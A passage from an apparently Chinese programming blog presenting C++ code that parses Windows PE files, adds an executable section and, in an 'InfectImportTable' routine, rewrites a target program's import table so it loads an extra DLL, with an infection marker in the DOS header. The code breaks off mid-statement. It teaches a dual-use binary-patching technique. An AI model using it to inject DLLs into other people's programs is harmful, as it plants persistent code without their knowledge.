class="hljs-keyword">break</span>;<br>&#125;<br>ImageImportDescriptor++;<br>&#125;<br><br><br><span class="hljs-keyword">return</span> IsOk;<br>&#125;<br><span class="hljs-function">BOOL <span class="hljs-title">_CPEImage::SnapThunk</span><span class="hljs-params">(HMODULE ModuleHandle,</span></span><br><span class="hljs-params"><span class="hljs-function"><span class="hljs-type">char</span> *Name, PBYTE ImageBase, PIMAGE_THUNK_DATA OriginalFirstThunk, PIMAGE_THUNK_DATA FirstThunk)</span></span><br><span class="hljs-function"></span>&#123;<br>BOOL IsOk = FALSE;<br>PIMAGE_IMPORT_BY_NAME  ImageImportByName = <span class="hljs-literal">NULL</span>;<br>DWORD v1 = <span class="hljs-number">0</span>;<br>ULONG Ordinal = <span class="hljs-number">0</span>;<br><br><span class="hljs-keyword">if</span> (OriginalFirstThunk-&gt;u1.AddressOfData &amp; IMAGE_ORDINAL_FLAG32)<br>&#123;<br>Ordinal = <span class="hljs-built_in">IMAGE_ORDINAL</span>(OriginalFirstThunk-&gt;u1.Ordinal);<br>v1 = (ULONG_PTR)<span class="hljs-built_in">GetProcAddress</span>(ModuleHandle, (LPCSTR)Ordinal);<br><br><span class="hljs-keyword">if</span> (v1 == <span class="hljs-number">0</span>)<br>&#123;<br>_tprintf(_T(<span class="hljs-string">&quot;无法在导入模块%s中定位导入函数:%d (序号)&quot;</span>), Name, Ordinal);<br>&#125;<br>&#125;<br><span class="hljs-keyword">else</span><br>&#123;<br>ImageImportByName = (PIMAGE_IMPORT_BY_NAME)(m_ModuleHandle + (ULONG)OriginalFirstThunk-&gt;u1.AddressOfData);<br>v1 = (ULONG_PTR)<span class="hljs-built_in">GetProcAddress</span>(ModuleHandle, (LPCSTR)ImageImportByName-&gt;Name);<br><span class="hljs-comment">//printf(&quot;0x%08X 按名称导入 : %s\n&quot;,dwFunAddr,pImpName-&gt;Name);</span><br><span class="hljs-keyword">if</span> (v1 == <span class="hljs-number">0</span>)<br>&#123;<br>_tprintf(_T(<span class="hljs-string">&quot;无法在导入模块%s中定位导入函数:%s &quot;</span>), Name, ImageImportByName-&gt;Name);<br>&#125;<br>&#125;<br><br><span class="hljs-keyword">if</span> (v1 != <span class="hljs-number">0</span>)<br>&#123;<br>FirstThunk-&gt;u1.Function = v1;<br>IsOk = TRUE;<br>&#125;<br><br><span class="hljs-keyword">return</span> IsOk;<br>&#125;<br><span class="hljs-comment">//根据相对虚拟地址查找所在的节</span><br><span class="hljs-function">PIMAGE_SECTION_HEADER <span class="hljs-title">_CPEImage::LocateSectionByRva</span><span class="hljs-params">(DWORD Rva)</span></span><br><span class="hljs-function"></span>&#123;<br>WORD i = <span class="hljs-number">0</span>;<br>PIMAGE_SECTION_HEADER ImageSectionHeader = m_ImageSectionHeader;<br><span class="hljs-keyword">for</span> (i = <span class="hljs-number">0</span>; i &lt; m_NumberOfSections; i++)<br>&#123;<br><span class="hljs-keyword">if</span> (ImageSectionHeader-&gt;VirtualAddress &lt;= Rva<br>&amp;&amp; Rva &lt; (ImageSectionHeader-&gt;VirtualAddress + ImageSectionHeader-&gt;Misc.VirtualSize))<br>&#123;<br><span class="hljs-keyword">return</span> ImageSectionHeader;<br>&#125;<br>ImageSectionHeader++;<br>&#125;<br><span class="hljs-keyword">return</span> <span class="hljs-literal">NULL</span>;<br>&#125;<br><span class="hljs-function">PIMAGE_SECTION_HEADER <span class="hljs-title">_CPEImage::LocateSectionByFileOffset</span><span class="hljs-params">(DWORD ParameterData)</span></span><br><span class="hljs-function"></span>&#123;<br>WORD i = <span class="hljs-number">0</span>;<br>PIMAGE_SECTION_HEADER ImageSectionHeader = m_ImageSectionHeader;<br><span class="hljs-keyword">for</span> (i = <span class="hljs-number">0</span>; i &lt; m_NumberOfSections; i++)<br>&#123;<br><span class="hljs-keyword">if</span> (ImageSectionHeader-&gt;PointerToRawData &lt;= ParameterData<br>&amp;&amp; ParameterData &lt; (ImageSectionHeader-&gt;PointerToRawData + ImageSectionHeader-&gt;SizeOfRawData))<br>&#123;<br><span class="hljs-keyword">return</span> ImageSectionHeader;<br>&#125;<br>ImageSectionHeader++;<br>&#125;<br><span class="hljs-keyword">return</span> <span class="hljs-literal">NULL</span>;<br>&#125;<br><span class="hljs-comment">//计算某个节按虚拟地址对齐后的空隙大小</span><br><span class="hljs-comment">//VirtualSize和RawSize不确定哪个比较大</span><br><span class="hljs-function">DWORD <span class="hljs-title">_CPEImage::GetSectionPhysialPaddingSize</span><span class="hljs-params">(PIMAGE_SECTION_HEADER ImageSectionHeader)</span></span><br><span class="hljs-function"></span>&#123;<br>DWORD PaddingSize = <span class="hljs-number">0</span>;<br><span class="hljs-keyword">if</span> (ImageSectionHeader-&gt;Misc.VirtualSize &lt; ImageSectionHeader-&gt;SizeOfRawData)<br>&#123;<br><span class="hljs-comment">//节的内存大小小于文件大小</span><br><span class="hljs-comment">/*</span><br><span class="hljs-comment">.text name</span><br><span class="hljs-comment">7748 virtual size</span><br><span class="hljs-comment">1000 virtual address</span><br><span class="hljs-comment">7800 size of raw data</span><br><span class="hljs-comment">*/</span><br>PaddingSize = ImageSectionHeader-&gt;SizeOfRawData - ImageSectionHeader-&gt;Misc.VirtualSize;<br>&#125;<br><span class="hljs-keyword">else</span><br>&#123;<br><span class="hljs-comment">//节的内存大小大于等于文件中的大小,则认为不存在空隙</span><br>PaddingSize = <span class="hljs-number">0</span>;<br><br>&#125;<br><span class="hljs-keyword">return</span> PaddingSize;<br>&#125;<br><br><span class="hljs-function">PIMAGE_SECTION_HEADER <span class="hljs-title">_CPEImage::AddNewSectionToFile</span><span class="hljs-params">(<span class="hljs-type">const</span> <span class="hljs-type">char</span> *SectionName, DWORD SectionSize)</span></span><br><span class="hljs-function"></span>&#123;<br>PIMAGE_SECTION_HEADER NewImageSectionHeader = m_ImageSectionHeader + m_NumberOfSections;<br>PIMAGE_SECTION_HEADER LastImageSectionHeader = m_ImageSectionHeader + m_NumberOfSections - <span class="hljs-number">1</span>;<br>DWORD VirtualAddress, PointerToRawData, VirtualSize;<br>LARGE_INTEGER v1;<br>BOOL IsOk = FALSE;<br>DWORD NumberOfBytesWritten = <span class="hljs-number">0</span>;<br><br><span class="hljs-comment">//计算新节的起始虚拟内存偏移</span><br>VirtualAddress = LastImageSectionHeader-&gt;VirtualAddress + <span class="hljs-built_in">GetAlignedSize</span>(LastImageSectionHeader-&gt;Misc.VirtualSize, m_ImageOptionalHeader-&gt;SectionAlignment);<br><span class="hljs-comment">//计算新节的物理起始偏移</span><br>PointerToRawData = LastImageSectionHeader-&gt;PointerToRawData + <span class="hljs-built_in">GetAlignedSize</span>(LastImageSectionHeader-&gt;SizeOfRawData, m_ImageOptionalHeader-&gt;FileAlignment);<br><span class="hljs-comment">//计算新节的大小，按文件对齐粒度对齐</span><br>VirtualSize = <span class="hljs-built_in">GetAlignedSize</span>(SectionSize, m_ImageOptionalHeader-&gt;FileAlignment);<br><br><span class="hljs-comment">//设置文件指针位置</span><br>v1.QuadPart = PointerToRawData + VirtualSize;<br>IsOk = <span class="hljs-built_in">SetFilePointerEx</span>(m_FileHandle, v1, <span class="hljs-literal">NULL</span>, FILE_BEGIN);<br><span class="hljs-keyword">if</span> (!IsOk)<br>&#123;<br><br><span class="hljs-keyword">return</span> <span class="hljs-literal">NULL</span>;<br><br>&#125;<br><br>IsOk = <span class="hljs-built_in">SetEndOfFile</span>(m_FileHandle);<br><span class="hljs-keyword">if</span> (!IsOk)<br>&#123;<br><span class="hljs-keyword">return</span> <span class="hljs-literal">NULL</span>;<br><br>&#125;<br><br><span class="hljs-comment">//填充SectionHeader</span><br><span class="hljs-built_in">ZeroMemory</span>(NewImageSectionHeader, <span class="hljs-built_in">sizeof</span>(IMAGE_SECTION_HEADER));<br><span class="hljs-built_in">strncpy_s</span>((<span class="hljs-type">char</span>*)NewImageSectionHeader-&gt;Name,<span class="hljs-number">8</span>, SectionName, <span class="hljs-number">8</span>);<br>NewImageSectionHeader-&gt;Misc.VirtualSize = VirtualSize;<br>NewImageSectionHeader-&gt;VirtualAddress = VirtualAddress;<br>NewImageSectionHeader-&gt;PointerToRawData = PointerToRawData;<br>NewImageSectionHeader-&gt;SizeOfRawData = VirtualSize;<br>NewImageSectionHeader-&gt;Characteristics = IMAGE_SCN_CNT_INITIALIZED_DATA | IMAGE_SCN_MEM_READ | IMAGE_SCN_MEM_WRITE | IMAGE_SCN_MEM_EXECUTE;<br><br><span class="hljs-comment">//更新PE头中的节个数</span><br>m_ImageFileHeader-&gt;NumberOfSections += <span class="hljs-number">1</span>;<br>m_NumberOfSections++;<br><span class="hljs-comment">//更新PE头中的总映像大小</span><br>m_ImageOptionalHeader-&gt;SizeOfImage += VirtualSize;<br><br><span class="hljs-comment">//保存PE头到文件中</span><br>v1.QuadPart = <span class="hljs-number">0</span>;<br>IsOk = <span class="hljs-built_in">SetFilePointerEx</span>(m_FileHandle, v1, <span class="hljs-literal">NULL</span>, FILE_BEGIN);<br><span class="hljs-keyword">if</span> (!IsOk)<br>&#123;<br><br><span class="hljs-keyword">return</span> <span class="hljs-literal">NULL</span>;<br><br>&#125;<br><br>IsOk = <span class="hljs-built_in">WriteFile</span>(m_FileHandle, m_ModuleHandle, m_ImageOptionalHeader-&gt;SizeOfHeaders, &amp;NumberOfBytesWritten, <span class="hljs-literal">NULL</span>);<br><span class="hljs-keyword">if</span> (!IsOk)<br>&#123;<br><br><span class="hljs-keyword">return</span> <span class="hljs-literal">NULL</span>;<br><br>&#125;<br><br><span class="hljs-built_in">FlushFileBuffers</span>(m_FileHandle);<br><span class="hljs-keyword">return</span> NewImageSectionHeader;<br>&#125;<br><span class="hljs-function">DWORD <span class="hljs-title">_CPEImage::Raw2Rva</span><span class="hljs-params">(DWORD FileOffset)</span></span><br><span class="hljs-function"></span>&#123;<br>DWORD RVA = <span class="hljs-number">0</span>;<br><span class="hljs-keyword">if</span> (FileOffset &lt; m_ImageOptionalHeader-&gt;SizeOfHeaders)<br>&#123;<br>RVA = FileOffset;<br><span class="hljs-keyword">return</span> RVA;<br>&#125;<br>PIMAGE_SECTION_HEADER ImageSectionHeader = <span class="hljs-built_in">LocateSectionByFileOffset</span>(FileOffset);<br><span class="hljs-keyword">if</span> (ImageSectionHeader != <span class="hljs-literal">NULL</span>)<br>&#123;<br>RVA = FileOffset - ImageSectionHeader-&gt;PointerToRawData + ImageSectionHeader-&gt;VirtualAddress;<br>&#125;<br><br><span class="hljs-keyword">return</span> RVA;<br>&#125;<br><span class="hljs-function">DWORD <span class="hljs-title">_CPEImage::Rva2Raw</span><span class="hljs-params">(DWORD Rva)</span></span><br><span class="hljs-function"></span>&#123;<br>DWORD FileOffset = <span class="hljs-number">0</span>;<br><span class="hljs-keyword">if</span> (Rva &lt; m_ImageOptionalHeader-&gt;SizeOfHeaders)<br>&#123;<br>FileOffset = Rva;<br><span class="hljs-keyword">return</span> FileOffset;<br>&#125;<br>PIMAGE_SECTION_HEADER ImageSectionHeader = <span class="hljs-built_in">LocateSectionByRva</span>(Rva);<br><span class="hljs-keyword">if</span> (ImageSectionHeader != <span class="hljs-literal">NULL</span>)<br>&#123;<br>FileOffset = Rva - ImageSectionHeader-&gt;VirtualAddress + ImageSectionHeader-&gt;PointerToRawData;<br>&#125;<br><br><span class="hljs-keyword">return</span> FileOffset;<br>&#125;<br></code></pre></td></tr></table></figure><p>3)InfectImportTable</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;windows.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;tchar.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;iostream&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&quot;_CPEImage.h&quot;</span></span><br><br><span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> std;<br><br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> INFECT_SIGNATURE (<span class="hljs-string">&#x27;PE&#x27;</span>)</span><br><br><span class="hljs-function">BOOL <span class="hljs-title">InfectImportTable</span><span class="hljs-params">(</span></span><br><span class="hljs-params"><span class="hljs-function">IN <span class="hljs-type">const</span> TCHAR *ImageFilePath,</span></span><br><span class="hljs-params"><span class="hljs-function">IN <span class="hljs-type">const</span> CHAR *DllName,</span></span><br><span class="hljs-params"><span class="hljs-function">IN <span class="hljs-type">const</span> CHAR *FunctionName)</span></span>;<br><span class="hljs-type">void</span> _tmain()<br>&#123;<br><span class="hljs-meta">#<span class="hljs-keyword">ifdef</span> _WIN64</span><br><span class="hljs-built_in">InfectImportTable</span>(_T(<span class="hljs-string">&quot;Demo.exe&quot;</span>), (<span class="hljs-string">&quot;Dll.dll&quot;</span>), (<span class="hljs-string">&quot;HelloWorld&quot;</span>));<br><span class="hljs-meta">#<span class="hljs-keyword">else</span></span><br><span class="hljs-built_in">InfectImportTable</span>(_T(<span class="hljs-string">&quot;Demo.exe&quot;</span>), (<span class="hljs-string">&quot;Dll.dll&quot;</span>), (<span class="hljs-string">&quot;HelloWorld&quot;</span>));<br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br>&#125;<br><br><span class="hljs-function">BOOL <span class="hljs-title">InfectImportTable</span><span class="hljs-params">(</span></span><br><span class="hljs-params"><span class="hljs-function">IN <span class="hljs-type">const</span> TCHAR *ImageFilePath,</span></span><br><span class="hljs-params"><span class="hljs-function">IN <span class="hljs-type">const</span> CHAR *DllName,</span></span><br><span class="hljs-params"><span class="hljs-function">IN <span class="hljs-type">const</span> CHAR *FunctionName)</span></span><br><span class="hljs-function"></span>&#123;<br><br>BOOL IsOk = FALSE;<br>WORD i = <span class="hljs-number">0</span>;<br>DWORD NumberOfBytesWritten = <span class="hljs-number">0</span>;<br>PIMAGE_SECTION_HEADER ImageSectionHeader, NewImageSectionHeader = <span class="hljs-literal">NULL</span>, TargetImageSectionHeader = <span class="hljs-literal">NULL</span>;<br>DWORD OldImportDataCount = <span class="hljs-number">0</span>, NewImportDataCount = <span class="hljs-number">0</span>;<br>DWORD OldImportDataSize = <span class="hljs-number">0</span>, NewImportDataSize = <span class="hljs-number">0</span>;<br>DWORD v5 = <span class="hljs-number">0</span>;              <span class="hljs-comment">//新导入表数组的存储位置</span><br>DWORD NewThunkDataSize = <span class="hljs-number">0</span>; <br>DWORD NewThunkDataVA = <span class="hljs-number">0</span>;<span class="hljs-comment">//新导入项的ThunkData的存储位置</span><br>DWORD SizeNeed = <span class="hljs-number">0</span>;<br>DWORD v2 = <span class="hljs-number">0</span>;<br>BOOL IsUseNewSection = FALSE; <span class="hljs-comment">//是否使用了新节</span><br>BOOL IsPlaceThunkDataToOldIID = TRUE; <span class="hljs-comment">//表明ThunkData存放的位置是不是在原来的IID位置，如果放不下，得找新位置</span><br><br>_CPEImage v1;<br><br><span class="hljs-comment">//获得被感染PE文件文件句柄</span><br>HANDLE FileHandle = <span class="hljs-built_in">CreateFile</span>(ImageFilePath,<br>GENERIC_READ | GENERIC_WRITE,<br>FILE_SHARE_READ,<br><span class="hljs-literal">NULL</span>,<br>OPEN_EXISTING,<br>FILE_ATTRIBUTE_NORMAL,<br><span class="hljs-literal">NULL</span>);<br><br><span class="hljs-comment">//解析PE结构</span><br>PBYTE BufferData = v1.<span class="hljs-built_in">LoadImage</span>(FileHandle, FALSE, <span class="hljs-number">0</span>, FALSE);<br><br><br><span class="hljs-keyword">if</span> (BufferData == <span class="hljs-literal">NULL</span>)<br>&#123;<br><span class="hljs-keyword">return</span> FALSE;<br>&#125;<br><br><span class="hljs-comment">//检查是否被感染过</span><br><span class="hljs-keyword">if</span> (v1.m_ImageDosHeader-&gt;e_csum == INFECT_SIGNATURE)<br>&#123;<br>_tprintf(_T(<span class="hljs-string">&quot;文件已经被感染过!\n&quot;</span>));<br><span class="hljs-keyword">return</span> FALSE;<br>&#125;<br><br><span class="hljs-comment">//计算PE文件的节中是否存在空隙</span><br><br>OldImportDataSize = v1.m_ImportDataTable-&gt;Size;<br>OldImportDataCount = OldImportDataSize / <span class="hljs-built_in">sizeof</span>(IMAGE_IMPORT_DESCRIPTOR);  <span class="hljs-comment">//获取导入表描述的个数</span><br><br><br>NewImportDataCount = OldImportDataCount + <span class="hljs-number">1</span>;<br>NewImportDataSize = NewImportDataCount * <span class="hljs-built_in">sizeof</span>(IMAGE_IMPORT_DESCRIPTOR);  <br><br>SizeNeed = NewImportDataSize; <span class="hljs-comment">//所需的大小是新导入表IID结构的大小</span><br><br><br><br>ImageSectionHeader = v1.<span class="hljs-built_in">LocateSectionByRva</span>(v1.m_ImportDataTable-&gt;VirtualAddress);   <span class="hljs-comment">//导入表在哪个节中</span><br><br><br><span class="hljs-comment">/*</span><br><span class="hljs-comment">typedef struct _IMAGE_SECTION_HEADER &#123;</span><br><span class="hljs-comment">BYTE    Name[IMAGE_SIZEOF_SHORT_NAME];</span><br><span class="hljs-comment">union &#123;</span><br><span class="hljs-comment">DWORD   PhysicalAddress;</span><br><span class="hljs-comment">DWORD   VirtualSize;     //节中数据的真实大小</span><br><span class="hljs-comment">&#125; Misc;</span><br><span class="hljs-comment">DWORD   VirtualAddress;</span><br><span class="hljs-comment">DWORD   SizeOfRawData;           //文件粒度对齐后的大小</span><br><span class="hljs-comment">DWORD   PointerToRawData;</span><br><span class="hljs-comment">DWORD   PointerToRelocations;</span><br><span class="hljs-comment">DWORD   PointerToLinenumbers;</span><br><span class="hljs-comment">WORD    NumberOfRelocations;</span><br><span class="hljs-comment">WORD    NumberOfLinenumbers;</span><br><span class="hljs-comment">DWORD   Characteristics;</span><br><span class="hljs-comment">&#125; IMAGE_SECTION_HEADER, *PIMAGE_SECTION_HEADER</span><br><span class="hljs-comment"></span><br><span class="hljs-comment"></span><br><span class="hljs-comment">*/</span><br><br><br><br><br>DWORD PaddingSize = v1.<span class="hljs-built_in">GetSectionPhysialPaddingSize</span>(ImageSectionHeader);  <span class="hljs-comment">//空隙大小</span><br><br><span class="hljs-comment">//计算填充ThunkData需要的大小，它包括了OriginalFirstThunk、FirstThunk、IMPORT_BY_NAME，以及DllName</span><br>NewThunkDataSize = <span class="hljs-built_in">sizeof</span>(ULONG_PTR) * <span class="hljs-number">4</span> + <span class="hljs-built_in">strlen</span>(DllName) + <span class="hljs-number">1</span> + <span class="hljs-built_in">sizeof</span>(WORD) + <span class="hljs-built_in">strlen</span>(FunctionName) + <span class="hljs-number">1</span>;<br><br>NewThunkDataSize = <span class="hljs-built_in">ALIGN_SIZE_UP</span>(NewThunkDataSize, <span class="hljs-built_in">sizeof</span>(ULONG)); <span class="hljs-comment">//对齐</span><br><span class="hljs-comment">//判断原导入表位置能否写下新的ThunkData</span><br><br><span class="hljs-keyword">if</span> (NewThunkDataSize &gt; OldImportDataSize)<br>&#123;<br><span class="hljs-comment">//写不下,那么在寻找节隙时就要加上</span><br><span class="hljs-comment">//按ULONG_PTR对齐之后再添加ThunkData，虽然不按这个对齐也可以</span><br>v2 = <span class="hljs-built_in">ALIGN_SIZE_UP</span>(NewImportDataSize, <span class="hljs-built_in">sizeof</span>(ULONG_PTR));<br>SizeNeed = v2 + NewThunkDataSize;<br>IsPlaceThunkDataToOldIID = FALSE;<br>&#125;<br><br><span class="hljs-keyword">if</span> (PaddingSize &gt;= SizeNeed)<br>&#123;<br>_tprintf(_T(<span class="hljs-string">&quot;节空隙可以放下新的导入表，不需添加新节!\n&quot;</span>));<br>v5 = ImageSectionHeader-&gt;VirtualAddress + v1.<span class="hljs-built_in">GetAlignedSize</span>(ImageSectionHeader-&gt;Misc.VirtualSize, <span class="hljs-built_in">sizeof</span>(DWORD));<br>TargetImageSectionHeader = ImageSectionHeader;<br>&#125;<br><span class="hljs-keyword">else</span><br>&#123;<br>_tprintf(_T(<span class="hljs-string">&quot;节空隙不能放下新的导入表，需要添加新节!\n&quot;</span>));<br><span class="hljs-comment">//根据所需的空间大小添加一个新节</span><br>NewImageSectionHeader = v1.<span class="hljs-built_in">AddNewSectionToFile</span>(<span class="hljs-string">&quot;.Patch&quot;</span>, SizeNeed);<br>_tprintf(_T(<span class="hljs-string">&quot;新节添加完毕! VA = 0x%p  PointerToRawData = 0x%p  SizeOfRawData = 0x%p\n&quot;</span>,<br>NewImageSectionHeader-&gt;VirtualAddress, NewImageSectionHeader-&gt;PointerToRawData, NewImageSectionHeader-&gt;SizeOfRawData));<br>v5 = NewImageSectionHeader-&gt;VirtualAddress;<br>TargetImageSectionHeader = NewImageSectionHeader;<br>IsUseNewSection = TRUE;<br>&#125;<br><br><span class="hljs-comment">//保存原导入表</span><br>PIMAGE_IMPORT_DESCRIPTOR OldImageImportDescriptor = v1.m_ImageImportDescriptor;<br>PIMAGE_IMPORT_DESCRIPTOR v10 = (PIMAGE_IMPORT_DESCRIPTOR)<span class="hljs-built_in">malloc</span>(SizeNeed);<br><span class="hljs-built_in">ZeroMemory</span>(v10, SizeNeed);<br><span class="hljs-comment">//保存原来的导入表部分到新的中</span><br><span class="hljs-built_in">memcpy</span>(v10, OldImageImportDescriptor, OldImportDataSize);<br><br><br>PIMAGE_IMPORT_DESCRIPTOR NewImageImportDescriptor = v10 + OldImportDataCount - <span class="hljs-number">1</span>;<br><br><br><span class="hljs-comment">//需要注意的是，ThunkData在32位和64位下的长度是不一样的，所以这里定义为自适应的ULONG_PTR</span><br>PULONG_PTR OriginalFirstThunk = <span class="hljs-literal">NULL</span>;<br><span class="hljs-keyword">if</span> (IsPlaceThunkDataToOldIID)<br>&#123;<br><br>OriginalFirstThunk = (PULONG_PTR)(v1.m_ModuleHandle + v1.m_ImportDataTable-&gt;VirtualAddress);<br>NewThunkDataVA = v1.m_ImportDataTable-&gt;VirtualAddress;<br>&#125;<br><span class="hljs-keyword">else</span><br>&#123;<br><br>OriginalFirstThunk = (PULONG_PTR)((PBYTE)NewImageImportDescriptor + v2);<br>NewThunkDataVA = v5 + v2; <br>&#125;<br><span class="hljs-built_in">ZeroMemory</span>(OriginalFirstThunk, NewThunkDataSize);<br><br><br><span class="hljs-comment">//留出两项内容，第一项稍后填充，第二项填0作为结束标记</span><br>PULONG_PTR FirstThunk = OriginalFirstThunk + <span class="hljs-number">2</span>;<br><span class="hljs-comment">//留出两项内容,第一项稍后填充，第二项填0作为结束标记，之后作为Dll名称</span><br>PCHAR  v11 = (PCHAR)(FirstThunk + <span class="hljs-number">2</span>);<br><span class="hljs-comment">//保存dll名称</span><br><span class="hljs-built_in">strcpy</span>(v11,DllName);<br><br>SIZE_T v12 = <span class="hljs-built_in">strlen</span>(DllName);<br>v11[v12] = <span class="hljs-number">0</span>;<br><span class="hljs-comment">//接下来作为一个PIMPORT_BY_NAME结构</span><br>PIMAGE_IMPORT_BY_NAME ImageImportByName = (PIMAGE_IMPORT_BY_NAME)(v11 + v12 + <span class="hljs-number">1</span>);<br><span class="hljs-comment">//填充它</span><br>ImageImportByName-&gt;Hint = <span class="hljs-number">0</span>;<br><span class="hljs-built_in">strcpy</span>((<span class="hljs-type">char</span>*)ImageImportByName-&gt;Name, FunctionName);<br><br><br><span class="hljs-comment">//计算结束位置</span><br>PCHAR End = (PCHAR)ImageImportByName + <span class="hljs-built_in">sizeof</span>(ImageImportByName-&gt;Hint) + <span class="hljs-built_in">strlen</span>((<span class="hljs-type">char</span>*)ImageImportByName-&gt;Name) + <span class="hljs-number">1</span>;<br><span class="hljs-comment">//计算总占用的空间大小</span><br>DWORD NewEntrySize = (DWORD)End - (DWORD)OriginalFirstThunk;<br><br><span class="hljs-comment">//返过来填充OriginalFirstThunk和FirstThunk</span><br><span class="hljs-comment">//根据定义，OriginalFirst应指向IMAGE_IMPORT_BY_NAME结构的偏移</span><br>OriginalFirstThunk[<span class="hljs-number">0</span>] = NewThunkDataVA + ((PBYTE)ImageImportByName - 